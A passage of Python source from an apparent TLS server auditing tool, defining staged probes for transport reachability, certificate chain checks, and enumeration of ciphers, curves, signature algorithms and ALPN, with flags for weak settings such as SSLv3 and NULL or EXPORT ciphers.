        setk("stage01.record_fragment.sent_bytes", len(fragmented))
        setk("stage01.record_fragment.recv_bytes", len(data))
        if data:
            accepted = data[0] in (CT_HANDSHAKE, CT_ALERT)
            setk("stage01.record_fragment.accepted", accepted)
            emit_kv(emit, "sent_records", str(len(body)), BRAND)
            emit_kv(emit, "response_bytes", str(len(data)))
            if accepted:
                emit_alert(emit, "ok", "server accepted fragmented ClientHello")
            else:
                emit_alert(emit, "warn",
                           "server response is unusual (first byte 0x%02x)" % data[0])
        else:
            emit_alert(emit, "warn", "no response to fragmented ClientHello")
    except Exception as e:
        emit_alert(emit, "warn", "fragmentation probe failed: " + str(e))
        setk("stage01.record_fragment.error", str(e))
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _stage01_rtt(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "measuring TCP connect RTT and TLS handshake RTT over 5 samples")
    tcp = measure_rtt(target.host, target.port, samples=5, timeout=4.0)
    if tcp["median_ms"] is not None:
        setk("stage01.rtt.tcp_median_ms", tcp["median_ms"])
        setk("stage01.rtt.tcp_min_ms", tcp["min_ms"])
        setk("stage01.rtt.tcp_max_ms", tcp["max_ms"])
        emit_header(emit, "TCP connect RTT", LABEL2)
        emit_kv(emit, "tcp_median_ms", "%.3f" % tcp["median_ms"], BRAND)
        emit_kv(emit, "tcp_min_ms", "%.3f" % tcp["min_ms"])
        emit_kv(emit, "tcp_max_ms", "%.3f" % tcp["max_ms"])
        emit_kv(emit, "tcp_stdev_ms", "%.3f" % tcp["stdev_ms"])
    else:
        emit_alert(emit, "warn", "no TCP RTT samples collected")


def _stage01_tcpip(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "querying kernel socket options")
    out = probe_tcp_options(target.host, target.port, timeout=4.0)
    if out.get("error"):
        emit_alert(emit, "warn", "socket options probe failed: " + out["error"])
        return
    for k in ("ttl", "window", "mss"):
        v = out.get(k)
        if v is not None:
            setk("stage01.tcp_ip.%s" % k, v)
            emit_kv(emit, k, str(v), VALUE)
    if out.get("ttl") is not None:
        ttl = out["ttl"]
        for guess in (64, 128, 255):
            if ttl <= guess:
                hops = guess - ttl
                setk("stage01.tcp_ip.estimated_hops", hops)
                emit_kv(emit, "estimated_hops", str(hops), BRAND)
                break


def _stage01_timing(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "profiling server response timing")
    connect_samples = []
    for _ in range(3):
        t0 = time.time()
        s, _, err = connect_tcp(target.host, target.port, timeout=4.0)
        dt = time.time() - t0
        if s is None:
            continue
        connect_samples.append(dt * 1000.0)
        try:
            s.close()
        except Exception:
            pass
    if connect_samples:
        setk("stage01.timing.connect_ms_median",
             round(statistics.median(connect_samples), 3))
        emit_kv(emit, "connect_ms_median", "%.3f" % statistics.median(connect_samples), BRAND)
        emit_kv(emit, "connect_ms_min", "%.3f" % min(connect_samples))
        emit_kv(emit, "connect_ms_max", "%.3f" % max(connect_samples))
    else:
        emit_alert(emit, "warn", "all timing samples failed")


register_stage(StageSpec(1, "stage_01_transport_and_recon", "Transport & Recon",
    "Establishes the transport baseline against the target: DNS, TCP connect, banner, UDP, "
    "TLS 1.0-1.3 probes, ServerHello parse, extension enumeration, SNI behavior, "
    "fragmentation, RTT, TCP/IP fingerprint, timing profile.",
    [
        TestSpec("tcp.connect", "TCP socket connect + RTT", _stage01_tcp_connect, 10.0),
        TestSpec("tcp.banner", "service banner grab", _stage01_banner, 6.0),
        TestSpec("udp.probe", "UDP reachability", _stage01_udp, 6.0),
        TestSpec("dns.a", "A record resolution", _stage01_dns_a, 8.0),
        TestSpec("dns.aaaa", "AAAA record resolution", _stage01_dns_aaaa, 8.0),
        TestSpec("dns.cname", "CNAME chain", _stage01_dns_cname, 8.0),
        TestSpec("dns.https_rr", "HTTPS (SVCB) record", _stage01_dns_https, 8.0),
        TestSpec("tls.ssl3", "SSLv3 probe",
                 lambda e, s, k: _stage01_tls_version(e, s, k, 0x0300, "SSLv3", False), 8.0),
        TestSpec("tls.10", "TLS 1.0 probe",
                 lambda e, s, k: _stage01_tls_version(e, s, k, 0x0301, "TLS 1.0", False), 8.0),
        TestSpec("tls.11", "TLS 1.1 probe",
                 lambda e, s, k: _stage01_tls_version(e, s, k, 0x0302, "TLS 1.1", False), 8.0),
        TestSpec("tls.12", "TLS 1.2 probe",
                 lambda e, s, k: _stage01_tls_version(e, s, k, 0x0303, "TLS 1.2", False), 8.0),
        TestSpec("tls.13", "TLS 1.3 probe",
                 lambda e, s, k: _stage01_tls_version(e, s, k, 0x0303, "TLS 1.3", True), 8.0),
        TestSpec("serverhello.parse", "ServerHello decode", _stage01_serverhello, 8.0),
        TestSpec("extensions.enumerate", "decode all extensions", _stage01_extensions, 8.0),
        TestSpec("sni.probe", "SNI probe", _stage01_sni, 8.0),
        TestSpec("sni.omit", "no-SNI probe", _stage01_sni_omit, 8.0),
        TestSpec("record.fragment", "1-byte record fragmentation",
                 _stage01_record_fragment, 20.0),
        TestSpec("rtt.baseline", "RTT baseline", _stage01_rtt, 25.0),
        TestSpec("tcp.ip.fingerprint", "socket options + TTL", _stage01_tcpip, 8.0),
        TestSpec("timing.fingerprint", "timing profile", _stage01_timing, 20.0),
    ], 60.0))


def _stage02_fetch_chain(host, port, sni=None, timeout=4.0):
    out = {"ok": False, "certs_der": [], "error": "", "version_used": None}
    target_sni = sni or host
    attempts = [
        ("tls13", 0x0303, DEFAULT_TLS13_CIPHERS, True),
        ("tls12", 0x0303, DEFAULT_TLS12_CIPHERS, False),
        ("tls11", 0x0302, DEFAULT_TLS12_CIPHERS, False),
        ("tls10", 0x0301, DEFAULT_TLS12_CIPHERS, False),
    ]
    for label, ver, ciphers, is13 in attempts:
        r = tls_probe(host, port, ver, ciphers, timeout=timeout,
                       sni=target_sni, tls13=is13)
        cert = r.get("certificate")
        if cert and cert.certs:
            out["ok"] = True
            out["certs_der"] = list(cert.certs)
            out["version_used"] = label
            return out
    out["error"] = "no certificate captured"
    return out


def _stage02_sig_grade(alg):
    a = (alg or "").lower()
    if not a:
        return ("unknown", MUTED)
    if "md2" in a or "md4" in a or "md5" in a:
        return ("CRITICAL", DANGER)
    if "sha1" in a:
        return ("WEAK", WARN)
    if "sha256" in a or "sha384" in a or "sha512" in a or "sha224" in a:
        return ("ACCEPTABLE", OK)
    if "ed25519" in a or "ed448" in a:
        return ("STRONG", OK)
    return ("unknown", MUTED)


def _stage02_key_strength(parsed):
    out = {"type": None, "bits": 0, "e": None, "n": None, "curve_oid": "", "point_len": 0}
    if parsed.subject_pubkey is None:
        return out
    st = parsed.subject_pubkey.get("type")
    out["type"] = st
    if st == "rsa":
        out["n"] = parsed.rsa_n
        out["e"] = parsed.rsa_e
        out["bits"] = parsed.rsa_n.bit_length() if parsed.rsa_n else 0
    elif st == "ec":
        out["bits"] = parsed.pubkey_size_bits
        out["curve_oid"] = parsed.ec_curve_oid.hex()
        out["point_len"] = len(parsed.ec_point) if parsed.ec_point else 0
    elif st == "ed25519":
        out["bits"] = 255
    return out


def _stage02_chain_fetch(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "capturing full certificate chain (TLS 1.3 → 1.2 → 1.1 → 1.0)")
    r = _stage02_fetch_chain(target.host, target.port, sni=target.host, timeout=4.0)
    if not r["ok"]:
        emit_alert(emit, "error", "no certificate captured: " + r["error"])
        setk("stage02.chain.ok", False)
        raise RuntimeError(r["error"])
    der_list = r["certs_der"]
    setk("stage02.chain.ok", True)
    setk("stage02.chain.length", len(der_list))
    setk("stage02.chain.version_used", r["version_used"])
    setk("stage02.chain.der_sizes", [len(d) for d in der_list])
    emit_kv(emit, "version_used", r["version_used"], BRAND)
    emit_kv(emit, "certificates_returned", str(len(der_list)), BRAND)
    emit_kv(emit, "total_der_bytes", str(sum(len(d) for d in der_list)))
    for i, der in enumerate(der_list):
        emit_kv(emit, "cert[%d].der_len" % i, "%d bytes" % len(der))
    parsed = [parse_der_certificate(d) for d in der_list]
    parsed = [p for p in parsed if p is not None]
    KB.set("_stage02_parsed_chain", parsed)
    KB.set("_stage02_der_list", der_list)
    emit_kv(emit, "parsed_successfully", str(len(parsed)))
    emit_alert(emit, "ok", "chain captured and cached")


def _stage02_leaf_parse(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        emit_alert(emit, "error", "no chain cached")
        setk("stage02.leaf.ok", False)
        return
    leaf = parsed[0]
    setk("stage02.leaf.ok", True)
    setk("stage02.leaf.version", leaf.version)
    setk("stage02.leaf.serial", "0x%x" % leaf.serial)
    setk("stage02.leaf.sig_alg", leaf.sig_hash)
    setk("stage02.leaf.issuer_cn", leaf.issuer_cn())
    setk("stage02.leaf.subject_cn", leaf.subject_cn())
    emit_kv(emit, "version", "v%d" % leaf.version, VALUE)
    emit_kv(emit, "serial", "0x%x" % leaf.serial, BRAND)
    grade, gc = _stage02_sig_grade(leaf.sig_hash)
    emit_kv(emit, "signature_algorithm", "%s  [%s]" % (leaf.sig_hash or "?", grade), gc)
    emit_kv(emit, "issuer_cn", leaf.issuer_cn() or "?")
    emit_kv(emit, "subject_cn", leaf.subject_cn() or "?")
    for k, v in leaf.subject_all()[:8]:
        if k and v:
            emit_kv(emit, "subject." + k, v, VALUE2)


def _stage02_leaf_san(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        emit_alert(emit, "error", "no chain cached")
        return
    leaf = parsed[0]
    setk("stage02.san.dns", list(leaf.san_dns))
    setk("stage02.san.ip", list(leaf.san_ip))
    emit_kv(emit, "dns_names", str(len(leaf.san_dns)), BRAND)
    for s in leaf.san_dns[:12]:
        emit_line(emit, "  " + GLYPH_BULLET + " " + s, VALUE)
    if leaf.san_ip:
        emit_kv(emit, "ip_addresses", ", ".join(leaf.san_ip[:8]))
    if not leaf.san_dns and not leaf.san_ip:
        emit_alert(emit, "warn", "no SAN extension present — modern validators will reject")


def _stage02_cn_san(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        return
    leaf = parsed[0]
    cn = leaf.subject_cn()
    in_san = cn in leaf.san_dns if cn else False
    setk("stage02.cn_san.cn", cn)
    setk("stage02.cn_san.in_san", in_san)
    emit_kv(emit, "cn", cn or "(absent)", VALUE)
    emit_kv(emit, "cn_in_san", "yes" if in_san else "no", OK if in_san else WARN)
    if not in_san and cn:
        emit_alert(emit, "warn", "CN not present in SAN list")


def _stage02_wildcard(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        return
    leaf = parsed[0]
    wilds = []
    for s in leaf.san_dns:
        if "*" in s:
            depth = 3 if s.startswith("*.*.") else (
                2 if s.startswith("*.") and s.count(".") == 1 else 1)
            wilds.append({"name": s, "depth": depth})
    setk("stage02.wildcard.count", len(wilds))
    if not wilds:
        emit_kv(emit, "wildcards", "0", OK)
        return
    emit_kv(emit, "wildcards", str(len(wilds)), WARN)
    for w in wilds[:8]:
        col = WARN if w["depth"] <= 2 else DANGER
        emit_kv(emit, w["name"], "depth=%d" % w["depth"], col)


def _stage02_expiry(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        return
    leaf = parsed[0]
    now = datetime.now(timezone.utc)
    days_remaining = None
    expired = False
    if leaf.valid_to:
        days_remaining = (leaf.valid_to - now).days
        expired = days_remaining < 0
    setk("stage02.expiry.days_remaining", days_remaining)
    setk("stage02.expiry.expired", expired)
    emit_kv(emit, "valid_from", leaf.valid_from.isoformat() if leaf.valid_from else "?")
    emit_kv(emit, "valid_to", leaf.valid_to.isoformat() if leaf.valid_to else "?")
    if days_remaining is not None:
        col = OK
        if expired or days_remaining <= 30:
            col = DANGER
        elif days_remaining <= 90:
            col = WARN
        emit_kv(emit, "days_remaining", str(days_remaining), col)
    if expired:
        emit_alert(emit, "error", "certificate EXPIRED")


def _stage02_key_params(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        return
    leaf = parsed[0]
    kp = _stage02_key_strength(leaf)
    setk("stage02.key.type", kp["type"])
    setk("stage02.key.bits", kp["bits"])
    setk("stage02.key.e", kp["e"])
    emit_kv(emit, "key_type", kp["type"] or "?", BRAND)
    emit_kv(emit, "key_bits", str(kp["bits"]), VALUE)
    if kp["type"] == "rsa":
        emit_kv(emit, "rsa_e", str(kp["e"]),
                 OK if kp["e"] and kp["e"] >= 65537 else WARN)
        if kp["bits"] < 2048:
            emit_alert(emit, "warn", "RSA modulus < 2048 bits")
        if kp["e"] and kp["e"] < 65537:
            emit_alert(emit, "warn", "RSA public exponent below 65537 (e=%d)" % kp["e"])
    elif kp["type"] == "ec":
        emit_kv(emit, "ec_curve_oid", kp["curve_oid"])
        emit_kv(emit, "ec_point_bytes", str(kp["point_len"]))


def _stage02_sig_algo(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        return
    for i, c in enumerate(parsed):
        grade, gc = _stage02_sig_grade(c.sig_hash)
        setk("stage02.sigalg.%d.algorithm" % i, c.sig_hash)
        setk("stage02.sigalg.%d.grade" % i, grade)
        emit_kv(emit, "cert[%d]" % i, "%s  [%s]" % (c.sig_hash or "?", grade), gc)


def _stage02_key_usage(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        return
    leaf = parsed[0]
    setk("stage02.ku.key_usage", list(leaf.key_usage))
    setk("stage02.ku.ext_key_usage", list(leaf.ext_key_usage))
    emit_kv(emit, "key_usage", ", ".join(leaf.key_usage) or "(absent)", VALUE)
    emit_kv(emit, "ext_key_usage", ", ".join(leaf.ext_key_usage) or "(absent)", VALUE)
    emit_kv(emit, "server_auth", "yes" if "serverAuth" in leaf.ext_key_usage else "no",
             OK if "serverAuth" in leaf.ext_key_usage else WARN)


def _stage02_chain_order(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        return
    self_signed = [i for i, c in enumerate(parsed) if c.is_self_signed()]
    roles = []
    for i, c in enumerate(parsed):
        if i == 0:
            roles.append("leaf")
        elif c.basic_constraints_ca:
            roles.append("intermediate")
        else:
            roles.append("unknown")
    setk("stage02.chain_order.length", len(parsed))
    setk("stage02.chain_order.self_signed_positions", self_signed)
    setk("stage02.chain_order.order_ok", bool(self_signed) and self_signed[0] == 0)
    emit_kv(emit, "chain_length", str(len(parsed)), BRAND)
    for i, role in enumerate(roles):
        colour = OK if role == "leaf" else BRAND if role == "intermediate" else ACCENT
        emit_kv(emit, "cert[%d]" % i, role, colour)
    emit_kv(emit, "self_signed_positions", str(self_signed))
    if len(parsed) == 1:
        emit_alert(emit, "warn",
                   "server sent only 1 certificate — intermediate may be missing")


register_stage(StageSpec(2, "stage_02_cert_chain", "Certificate Chain Analysis",
    "Captures and analyzes the full certificate chain: leaf parsing, SAN enumeration, "
    "CN/SAN consistency, wildcard scope, validity window, key parameters, signature "
    "algorithm grading, key usage / EKU flags, chain order classification.",
    [
        TestSpec("chain.fetch", "capture certificate chain", _stage02_chain_fetch, 15.0),
        TestSpec("leaf.parse", "parse leaf certificate", _stage02_leaf_parse, 8.0),
        TestSpec("leaf.san", "enumerate SAN entries", _stage02_leaf_san, 8.0),
        TestSpec("cn.san.match", "CN vs SAN consistency", _stage02_cn_san, 6.0),
        TestSpec("wildcard.scope", "wildcard scope", _stage02_wildcard, 6.0),
        TestSpec("expiry.math", "validity window", _stage02_expiry, 6.0),
        TestSpec("key.params", "public key parameters", _stage02_key_params, 6.0),
        TestSpec("sig.algo", "signature algorithm grading", _stage02_sig_algo, 6.0),
        TestSpec("key.usage", "KeyUsage / EKU flags", _stage02_key_usage, 6.0),
        TestSpec("chain.order", "chain order classification", _stage02_chain_order, 6.0),
    ], 60.0))


def _stage03_iterate_ciphers(host, port, version, cipher_ids, timeout=3.0, sni=None):
    out = {"accepted": [], "rejected": [], "alerts": {}, "rounds": 0}
    remaining = list(dict.fromkeys(cipher_ids))
    rounds = 0
    while remaining and rounds < 400:
        rounds += 1
        r = tls_probe(host, port, version, remaining, timeout=timeout, sni=sni,
                       groups=DEFAULT_GROUPS, sig_algs=DEFAULT_SIG_ALGS)
        sh = r.get("server_hello")
        if not sh:
            for a in r.get("alerts", []):
                out["alerts"][a[2]] = out["alerts"].get(a[2], 0) + 1
            break
        chosen = sh.cipher_suite
        out["accepted"].append(chosen)
        if chosen not in remaining:
            break
        remaining.remove(chosen)
    out["rounds"] = rounds
    out["rejected"] = remaining
    return out


def _stage03_probe_preferred(host, port, version, candidates, timeout=3.0, sni=None):
    r = tls_probe(host, port, version, candidates, timeout=timeout, sni=sni)
    sh = r.get("server_hello")
    return sh.cipher_suite if sh else None


def _stage03_enumerate_groups(host, port, version=0x0303, timeout=3.0, sni=None):
    out = {"accepted": [], "rejected": [], "error": ""}
    remaining = list(DEFAULT_GROUPS)
    rounds = 0
    while remaining and rounds < 50:
        rounds += 1
        r = tls_probe(host, port, version,
                       [0xc02f, 0xc030, 0xc02b, 0xc02c, 0xcca8, 0xcca9],
                       timeout=timeout, sni=sni, groups=remaining,
                       sig_algs=DEFAULT_SIG_ALGS)
        ske = r.get("ske")
        if not ske or ske.named_curve_id is None:
            break
        gid = ske.named_curve_id
        if gid not in remaining:
            break
        out["accepted"].append(gid)
        remaining.remove(gid)
    out["rejected"] = remaining
    return out


def _stage03_preferred_group(host, port, groups, version=0x0303, timeout=3.0, sni=None):
    r = tls_probe(host, port, version,
                   [0xc02f, 0xc030, 0xc02b, 0xc02c, 0xcca8, 0xcca9],
                   timeout=timeout, sni=sni, groups=groups,
                   sig_algs=DEFAULT_SIG_ALGS)
    ske = r.get("ske")
    return ske.named_curve_id if ske else None


def _stage03_cipher_enum_tls12(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "TLS 1.2 cipher enumeration (real ServerHello pinning)")
    result = _stage03_iterate_ciphers(target.host, target.port, 0x0303,
                                       DEFAULT_TLS12_CIPHERS,
                                       timeout=4.0, sni=target.host)
    accepted = result["accepted"]
    setk("stage03.cipher.tls12.accepted", accepted)
    setk("stage03.cipher.tls12.rounds", result["rounds"])
    emit_kv(emit, "rounds", str(result["rounds"]), BRAND)
    emit_kv(emit, "accepted_count", str(len(accepted)), OK if accepted else WARN)
    for cid in accepted[:30]:
        emit_kv(emit, "0x%04x" % cid, cipher_name(cid), VALUE)


def _stage03_cipher_enum_tls11(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "TLS 1.1 cipher enumeration")
    result = _stage03_iterate_ciphers(target.host, target.port, 0x0302,
                                       DEFAULT_TLS12_CIPHERS,
                                       timeout=4.0, sni=target.host)
    accepted = result["accepted"]
    setk("stage03.cipher.tls11.accepted", accepted)
    emit_kv(emit, "accepted_count", str(len(accepted)), OK if accepted else WARN)
    for cid in accepted[:20]:
        emit_kv(emit, "0x%04x" % cid, cipher_name(cid), VALUE)


def _stage03_cipher_enum_tls10(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "TLS 1.0 cipher enumeration")
    result = _stage03_iterate_ciphers(target.host, target.port, 0x0301,
                                       DEFAULT_TLS12_CIPHERS,
                                       timeout=4.0, sni=target.host)
    accepted = result["accepted"]
    setk("stage03.cipher.tls10.accepted", accepted)
    emit_kv(emit, "accepted_count", str(len(accepted)), OK if accepted else WARN)
    for cid in accepted[:20]:
        emit_kv(emit, "0x%04x" % cid, cipher_name(cid), VALUE)


def _stage03_cipher_enum_ssl3(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "SSLv3 cipher enumeration")
    result = _stage03_iterate_ciphers(target.host, target.port, 0x0300,
                                       DEFAULT_TLS12_CIPHERS,
                                       timeout=4.0, sni=target.host)
    accepted = result["accepted"]
    setk("stage03.cipher.ssl3.accepted", accepted)
    emit_kv(emit, "accepted_count", str(len(accepted)), OK if not accepted else DANGER)
    if accepted:
        emit_alert(emit, "vuln", "SSLv3 accepted — POODLE precondition")
        setk("vulnerability.poodle.ssl3_accepted", True)
        count("vulns")


def _stage03_cipher_enum_tls13(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "TLS 1.3 cipher suite probing")
    accepted = []
    for cid in [0x1301, 0x1302, 0x1303, 0x1304, 0x1305]:
        r = tls_probe(target.host, target.port, 0x0303, [cid], timeout=4.0,
                       sni=target.host, tls13=True)
        sh = r.get("server_hello")
        if sh and sh.cipher_suite == cid:
            accepted.append(cid)
    setk("stage03.cipher.tls13.accepted", accepted)
    emit_kv(emit, "accepted_count", str(len(accepted)), OK if accepted else MUTED)
    for cid in accepted:
        emit_kv(emit, "0x%04x" % cid, cipher_name(cid), VALUE)


def _stage03_bits_dist(emit, setk, kb):
    all_accepted = []
    for ver in ("tls12", "tls11", "tls10", "tls13"):
        for c in kb.get("stage03.cipher.%s.accepted" % ver) or []:
            if c not in all_accepted:
                all_accepted.append(c)
    if not all_accepted:
        emit_alert(emit, "warn", "no ciphers enumerated")
        return
    by_bits = _StdCounter()
    for c in all_accepted:
        by_bits[cipher_bits(c)] += 1
    setk("stage03.bits_distribution.total", len(all_accepted))
    setk("stage03.bits_distribution.by_bits", dict(by_bits))
    emit_header(emit, "key size histogram")
    for bits, cnt in sorted(by_bits.items()):
        col = DANGER if bits <= 56 else WARN if bits < 128 else OK
        emit_kv(emit, "%d bits" % bits, str(cnt), col)


def _stage03_kx_dist(emit, setk, kb):
    all_accepted = []
    for ver in ("tls12", "tls11", "tls10", "tls13"):
        for c in kb.get("stage03.cipher.%s.accepted" % ver) or []:
            if c not in all_accepted:
                all_accepted.append(c)
    if not all_accepted:
        return
    by_kx = _StdCounter()
    for c in all_accepted:
        by_kx[cipher_kx(c)] += 1
    setk("stage03.kx_distribution.by_kx", dict(by_kx))
    for kx, cnt in by_kx.most_common():
        emit_kv(emit, kx, str(cnt), BRAND)


def _stage03_aead_vs_cbc(emit, setk, kb):
    all_accepted = []
    for ver in ("tls12", "tls11", "tls10", "tls13"):
        for c in kb.get("stage03.cipher.%s.accepted" % ver) or []:
            if c not in all_accepted:
                all_accepted.append(c)
    if not all_accepted:
        return
    aead = cbc = stream = 0
    for cid in all_accepted:
        nm = cipher_name(cid).upper()
        if "GCM" in nm or "CCM" in nm or "CHACHA20" in nm or "POLY1305" in nm:
            aead += 1
        elif "CBC" in nm:
            cbc += 1
        elif "RC4" in nm:
            stream += 1
    setk("stage03.aead_vs_cbc.aead", aead)
    setk("stage03.aead_vs_cbc.cbc", cbc)
    setk("stage03.aead_vs_cbc.stream", stream)
    emit_kv(emit, "AEAD suites", str(aead), OK)
    emit_kv(emit, "CBC suites", str(cbc), WARN if cbc else OK)
    emit_kv(emit, "RC4/stream", str(stream), DANGER if stream else OK)


def _stage03_weak(emit, setk, kb):
    all_accepted = []
    for ver in ("tls12", "tls11", "tls10", "ssl3", "tls13"):
        for c in kb.get("stage03.cipher.%s.accepted" % ver) or []:
            if c not in all_accepted:
                all_accepted.append(c)
    if not all_accepted:
        return
    weak = {"null": [], "export": [], "anon": [], "weak": []}
    for cid in all_accepted:
        nm = cipher_name(cid).upper()
        kx = cipher_kx(cid)
        if "NULL" in nm:
            weak["null"].append(cid)
        if "EXPORT" in nm:
            weak["export"].append(cid)
        if "ANON" in nm or "anon" in kx:
            weak["anon"].append(cid)
        if "RC4" in nm or "3DES" in nm or cipher_bits(cid) <= 56:
            weak["weak"].append(cid)
    setk("stage03.weak.null", weak["null"])
    setk("stage03.weak.export", weak["export"])
    setk("stage03.weak.anon", weak["anon"])
    setk("stage03.weak.weak", weak["weak"])
    if weak["null"]:
        for cid in weak["null"]:
            emit_kv(emit, cipher_name(cid), "NULL cipher", DANGER)
        emit_alert(emit, "vuln", "NULL cipher accepted")
        count("vulns")
    else:
        emit_kv(emit, "NULL ciphers", "none", OK)
    if weak["export"]:
        for cid in weak["export"]:
            emit_kv(emit, cipher_name(cid), "EXPORT", DANGER)
        emit_alert(emit, "vuln", "EXPORT cipher accepted")
        count("vulns")
    else:
        emit_kv(emit, "EXPORT ciphers", "none", OK)
    if weak["anon"]:
        for cid in weak["anon"]:
            emit_kv(emit, cipher_name(cid), "anon", DANGER)
        emit_alert(emit, "vuln", "anonymous DH accepted")
        count("vulns")
    else:
        emit_kv(emit, "anonymous ciphers", "none", OK)


def _stage03_cipher_preferred(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "probing server cipher preference via order reversal")
    tls12 = kb.get("stage03.cipher.tls12.accepted") or []
    if not tls12:
        emit_alert(emit, "warn", "no TLS 1.2 ciphers enumerated")
        return
    pref_a = _stage03_probe_preferred(target.host, target.port, 0x0303, tls12,
                                       timeout=4.0, sni=target.host)
    pref_b = _stage03_probe_preferred(target.host, target.port, 0x0303,
                                       list(reversed(tls12)), timeout=4.0,
                                       sni=target.host)
    setk("stage03.preferred.first_order", pref_a)
    setk("stage03.preferred.reversed_order", pref_b)
    if pref_a is not None:
        emit_kv(emit, "forward_order_first",
                 "0x%04x %s" % (pref_a, cipher_name(pref_a)), VALUE)
    if pref_b is not None:
        emit_kv(emit, "reversed_order_first",
                 "0x%04x %s" % (pref_b, cipher_name(pref_b)), VALUE)
    if pref_a is not None and pref_b is not None:
        if pref_a == pref_b:
            setk("stage03.preferred.server_side", True)
            emit_alert(emit, "ok", "server enforces own preference")
        else:
            setk("stage03.preferred.server_side", False)
            emit_alert(emit, "warn", "server honors client order")


def _stage03_curve_enum(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "EC named curve enumeration")
    result = _stage03_enumerate_groups(target.host, target.port, 0x0303,
                                        timeout=4.0, sni=target.host)
    accepted = result["accepted"]
    setk("stage03.curve.enum.accepted", accepted)
    setk("stage03.curve.enum.accepted_names", [group_name(g) for g in accepted])
    emit_kv(emit, "accepted_count", str(len(accepted)), BRAND)
    for gid in accepted:
        emit_kv(emit, "0x%04x" % gid, group_name(gid), VALUE)


def _stage03_curve_preferred(emit, setk, kb):
    target = _current_target()
    accepted = kb.get("stage03.curve.enum.accepted") or []
    if len(accepted) < 2:
        emit_alert(emit, "info", "fewer than 2 curves available")
        return
    emit_header(emit, "preferred curve via order reversal")
    forward = _stage03_preferred_group(target.host, target.port, accepted,
                                        timeout=4.0, sni=target.host)
    reverse = _stage03_preferred_group(target.host, target.port,
                                        list(reversed(accepted)),
                                        timeout=4.0, sni=target.host)
    setk("stage03.curve.preferred.forward", forward)
    setk("stage03.curve.preferred.reverse", reverse)
    if forward is not None:
        emit_kv(emit, "forward_first", group_name(forward), VALUE)
    if reverse is not None:
        emit_kv(emit, "reverse_first", group_name(reverse), VALUE)
    if forward is not None and reverse is not None and forward == reverse:
        setk("stage03.curve.preferred.server_side", True)
        emit_alert(emit, "ok", "server enforces own curve preference")


def _stage03_sigalg_enum(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "signature algorithm enumeration via ServerKeyExchange")
    candidates = [0x0403, 0x0503, 0x0603, 0x0401, 0x0501, 0x0601,
                  0x0804, 0x0805, 0x0806, 0x0807, 0x0808, 0x0201, 0x0203]
    accepted = []
    for sa in candidates:
        r = tls_probe(target.host, target.port, 0x0303,
                       [0xc02f, 0xc030, 0xc02b, 0xc02c, 0xcca8, 0xcca9],
                       timeout=3.0, sni=target.host, groups=[23, 24, 25, 29],
                       sig_algs=[sa])
        ske = r.get("ske")
        if ske and ske.signature_alg is not None and ske.signature_alg == sa and sa not in accepted:
            accepted.append(sa)
    setk("stage03.sigalg.enum.accepted", accepted)
    setk("stage03.sigalg.enum.names", [sig_alg_name(s) for s in accepted])
    emit_kv(emit, "accepted_count", str(len(accepted)), BRAND)
    for sa in accepted:
        emit_kv(emit, "0x%04x" % sa, sig_alg_name(sa), VALUE)


def _stage03_sigalg_weak(emit, setk, kb):
    accepted = kb.get("stage03.sigalg.enum.accepted") or []
    weak = [sa for sa in accepted
            if "sha1" in sig_alg_name(sa).lower() or "md5" in sig_alg_name(sa).lower()]
    setk("stage03.sigalg.weak.accepted", weak)
    emit_kv(emit, "sig_algs_total", str(len(accepted)))
    emit_kv(emit, "weak_count", str(len(weak)), WARN if weak else OK)
    for sa in weak:
        emit_kv(emit, "0x%04x" % sa, sig_alg_name(sa), WARN)
    if weak:
        emit_alert(emit, "warn",
                   "%d legacy signature algorithms accepted" % len(weak))
    else:
        emit_alert(emit, "ok", "no SHA-1 or MD5 signature algorithms accepted")


def _stage03_alpn_enum(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "ALPN negotiation")
    candidates = ["h2", "http/1.1", "h2c", "h3", "h3-29", "spdy/3.1", "http/1.0"]
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host, alpn=candidates)
    sh = r.get("server_hello")
    accepted = None
    if sh:
        ext = sh.ext_by_id(EXT_ALPN)
        if ext:
            plist = ext.decoded.get("protocols", [])
            if plist:
                accepted = plist
    if accepted:
        setk("stage03.alpn.accepted", accepted)
        for p in accepted:
            emit_kv(emit, "alpn", p, BRAND)
    else:
        setk("stage03.alpn.accepted", [])
        emit_kv(emit, "alpn", "(no ALPN)", MUTED)


def _stage03_alpn_pref(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "ALPN server preference test")
    orders = [(["h2", "http/1.1"], "h2_first"), (["http/1.1", "h2"], "h11_first")]
    results = {}
    for plist, label in orders:
        r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                       timeout=4.0, sni=target.host, alpn=plist)
        sh = r.get("server_hello")
        chosen = None
        if sh:
            ext = sh.ext_by_id(EXT_ALPN)
            if ext:
                pl = ext.decoded.get("protocols", [])
                chosen = pl[0] if pl else None
        results[label] = chosen
        setk("stage03.alpn.%s" % label, chosen)
    for label, chosen in results.items():
        emit_kv(emit, label, chosen or "(none)", BRAND if chosen else MUTED)


def _stage03_scsv(emit, setk, kb):
